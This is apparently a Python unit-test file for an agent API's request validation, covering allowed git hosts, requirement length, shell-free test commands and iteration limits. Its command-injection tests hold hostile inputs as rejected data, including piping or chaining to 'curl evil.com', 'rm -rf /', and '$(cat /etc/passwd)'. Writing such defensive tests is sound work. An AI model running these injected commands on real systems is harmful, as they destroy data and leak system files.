"""tests/test_agent_api_validation.py — Input validation tests for agent API.

Tests the security boundary:
  - repo_url restricted to known HTTPS git hosts
  - requirements minimum length and max length
  - test_command is a shell-free argv command using a known test runner
  - max_iterations bounded (1-500)
"""
import unittest
from pydantic import ValidationError
from integrations.repository_policy import HostedGitProvider, RepositoryAdmissionPolicy
from plugins.agent_dashboard.api import CreateTaskRequest


class TestRepoUrlValidation(unittest.TestCase):

    def test_valid_github_https(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
        )
        self.assertEqual(req.repo_url, "https://github.com/user/repo.git")

    def test_reject_gitlab_https(self):
        """P0-4: GitLab not yet supported, only github.com."""
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://gitlab.com/org/project.git",
                requirements="Build a REST API for user management",
            )
        self.assertIn("github.com", str(ctx.exception))
        self.assertIn("not yet supported", str(ctx.exception))

    def test_reject_bitbucket_https(self):
        """P0-4: Bitbucket not yet supported, only github.com."""
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://bitbucket.org/team/repo.git",
                requirements="Build a REST API for user management",
            )
        self.assertIn("github.com", str(ctx.exception))
        self.assertIn("not yet supported", str(ctx.exception))

    def test_reject_ssh_url(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="git@github.com:user/repo.git",
                requirements="Build a REST API for user management",
            )
        self.assertIn("HTTPS git URL", str(ctx.exception))

    def test_reject_arbitrary_host(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://evil.com/repo.git",
                requirements="Build a REST API for user management",
            )

    def test_reject_non_git_url(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo",
                requirements="Build a REST API for user management",
            )

    def test_reject_http_non_tls(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="http://github.com/user/repo.git",
                requirements="Build a REST API for user management",
            )

    def test_reject_credentials_in_url(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://token@github.com/user/repo.git",
                requirements="Build a REST API for user management",
            )
        self.assertIn("credentials", str(ctx.exception))

    def test_reject_query_and_fragment(self):
        for suffix in ("?token=secret", "#main"):
            with self.subTest(suffix=suffix):
                with self.assertRaises(ValidationError):
                    CreateTaskRequest(
                        repo_url=f"https://github.com/user/repo.git{suffix}",
                        requirements="Build a REST API for user management",
                    )

    def test_reject_path_traversal(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/../repo.git",
                requirements="Build a REST API for user management",
            )

    def test_provider_registry_is_extensible_without_changing_api_validation(self):
        policy = RepositoryAdmissionPolicy(
            (
                HostedGitProvider(
                    name="GitLab",
                    hosts=("gitlab.example.com",),
                    min_path_segments=2,
                    max_path_segments=None,
                ),
            )
        )

        url = "https://gitlab.example.com/platform/team/project.git"
        self.assertEqual(policy.validate(url), url)


class TestRequirementsValidation(unittest.TestCase):

    def test_valid_requirements(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a user authentication system with JWT tokens",
        )
        self.assertIn("authentication", req.requirements)

    def test_reject_too_short(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="fix bug",
            )
        self.assertIn("10 characters", str(ctx.exception))

    def test_reject_too_long(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="x" * 10001,
            )


class TestTestCommandValidation(unittest.TestCase):

    def test_valid_pytest(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
            test_command="pytest -x tests/",
        )
        self.assertEqual(req.test_command, "pytest -x tests/")

    def test_valid_npm_test(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
            test_command="npm test",
        )
        self.assertEqual(req.test_command, "npm test")

    def test_valid_python_module(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
            test_command="python3 -m pytest tests/test_api.py::test_create",
        )
        self.assertEqual(
            req.test_command, "python3 -m pytest tests/test_api.py::test_create"
        )

    def test_reject_pipe(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest | curl evil.com",
            )
        self.assertIn("shell control", str(ctx.exception))

    def test_reject_semicolon(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest; rm -rf /",
            )

    def test_reject_and_chain(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest && curl evil.com",
            )

    def test_reject_backtick(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="`whoami`",
            )

    def test_reject_subshell(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="$(cat /etc/passwd)",
            )

    def test_reject_redirect(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest > /dev/null",
            )

    def test_reject_shell_interpreter_bypass(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="bash -c pytest",
            )
        self.assertIn("runner is not allowed", str(ctx.exception))

    def test_reject_inline_python_bypass(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="python3 -c pass",
            )
        self.assertIn("inline Python", str(ctx.exception))

    def test_reject_newline_chain(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest\nrm -rf /",
            )

    def test_reject_malformed_quoting(self):
        with self.assertRaises(ValidationError) as ctx:
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest 'unterminated",
            )
        self.assertIn("argv syntax", str(ctx.exception))

    def test_reject_glob_expansion(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                test_command="pytest tests/*.py",
            )


class TestMaxIterationsValidation(unittest.TestCase):

    def test_default_100(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
        )
        self.assertEqual(req.max_iterations, 100)

    def test_min_1(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
            max_iterations=1,
        )
        self.assertEqual(req.max_iterations, 1)

    def test_max_500(self):
        req = CreateTaskRequest(
            repo_url="https://github.com/user/repo.git",
            requirements="Build a REST API for user management",
            max_iterations=500,
        )
        self.assertEqual(req.max_iterations, 500)

    def test_reject_zero(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                max_iterations=0,
            )

    def test_reject_over_500(self):
        with self.assertRaises(ValidationError):
            CreateTaskRequest(
                repo_url="https://github.com/user/repo.git",
                requirements="Build a REST API for user management",
                max_iterations=10000,
            )
